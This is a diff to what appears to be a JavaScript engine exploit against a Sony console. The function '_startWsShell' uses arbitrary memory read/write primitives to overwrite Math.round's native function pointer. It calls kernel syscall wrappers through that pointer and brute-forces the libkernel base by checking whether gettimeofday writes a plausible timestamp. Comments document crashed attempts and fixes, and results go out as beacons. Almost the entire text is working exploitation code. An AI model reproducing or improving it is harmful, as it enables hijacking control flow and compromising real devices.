@@ -5191,25 +5191,44 @@ function _startWsShell(){
         ELs('preflight0 -> '+String(Math.round(-5.7)));
         var origRoundFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
         ELs('preflight1 -> '+e2call(origRoundFn));
-        /* v3: THE DECODE-SAFE LADDER. The cpu verifier killed sessions 14/15:
-         * sceKernelGetCurrentCpu returns RAX=0 on CPU 0 - an INVALID JSValue
-         * encoding (null Cell) - and the engine dereferences it at first
-         * touch. The open-wrapper witness is decode-safe BY CONSTRUCTION:
-         * called with RDI = the zeroed fake scope it runs open("") -> ENOENT
-         * -> RAX = -1 = all-ones -> decodes cleanly as Int32 -1. A live-
-         * decoded -1 from a syscall wrapper IS the E2 witness. */
+        /* v4: THE DECODE-IMMUNE WITNESS - gettimeofday. Sessions 14/15/16 all:
+         * preflights -6/-6 then death at the first foreign call. Root cause
+         * (complete): raw syscall wrappers pass the kernel's RAX through and
+         * FreeBSD-family kernels return POSITIVE errnos - open("") -> RAX=2
+         * (ENOENT), not -1 (the -1 conversion lives in libc, above the
+         * wrapper). Every raw return so far (0, 0, 2) was an invalid JSValue
+         * encoding and crashed the engine at first touch - WITH THE BASES
+         * LIKELY RIGHT ALL THREE TIMES.
+         * THE FIX: eliminate decoding entirely. RDI = fakeScope = the tv
+         * buffer (its first 0x38 bytes are ours); the gettimeofday wrapper
+         * WRITES the unix wall clock there; the call's raw return is
+         * DISCARDED UNTOUCHED (an unbound expression statement - the JSValue
+         * never materializes, no deref, no crash) and the effect is read
+         * with absRead. A plausible timestamp = THE E2 WITNESS, decode-
+         * immune by construction. A wrong syscall number merely returns an
+         * errno (harmlessly discarded) - MULTIPLE candidates per session;
+         * only a wrong BASE (garbage entry) still kills. */
+        function e2callRaw(t){
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,t);
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,origFn);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+        }
         for(var ti=0;ti<clist.length&&ti<maxC;ti++){
           var B3=clist[ti].B;
           ELs('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
-          var r3=e2call(B3+BigInt(E2_LK.openWrapper));
-          ELs('openw -> '+r3);
-          var n3=Number(r3);
-          if(n3===-1){lkBase=B3;break;}
+          for(var zi=0;zi<4;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
+          e2callRaw(B3+BigInt(E2_LK.gettodWrapper));
+          var tv0=S.absRead(S.fakeScope,8)[0],tv1=S.absRead(S.fakeScope+8n,8)[0];
+          ELs('tv=0x'+tv0.toString(16)+' 0x'+tv1.toString(16));
+          if(tv0>0x40000000n&&tv0<0x80000000n&&tv1<0xF4240n){lkBase=B3;reply.tv='0x'+tv0.toString(16);break;}
         }
-        if(lkBase===null){reply.log=elog;reply.err='no candidate verified';break;}
-        /* ---- stage 4: E2 witness #2 - the pid (Sony pids observed odd:
-         * 79, 3429, 3443 - odd RAX decodes as Int32; raw = decoded*2+1) ---- */
-        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED (open wrapper -> -1)');
+        if(lkBase===null){reply.log=elog;reply.err='no candidate wrote a timestamp';break;}
+        /* ---- stage 4: garnish - the pid (post-witness; if the pid decodes
+         * badly the CONFIRMED beacon has already landed on sync channels) ---- */
+        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED (gettimeofday wrote the wall clock)');
         var pid=e2call(lkBase+BigInt(E2_LK.getpidWrapper));
         ELs('getpid -> '+pid);
         var pidN=Number(pid);
@@ -5219,7 +5238,7 @@ function _startWsShell(){
         reply.pidn=Number(pid);
         reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),pairs:c.pairs,wden:c.wden,demo:c.demo};});
         reply.log=elog;
-        try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' openw=-1 pid='+pid+' pidraw='+(reply.pidraw||'?'));}catch(e){}
+        try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' tv='+(reply.tv||'?')+' pid='+pid+' pidraw='+(reply.pidraw||'?'));}catch(e){}
         break;
       }
 
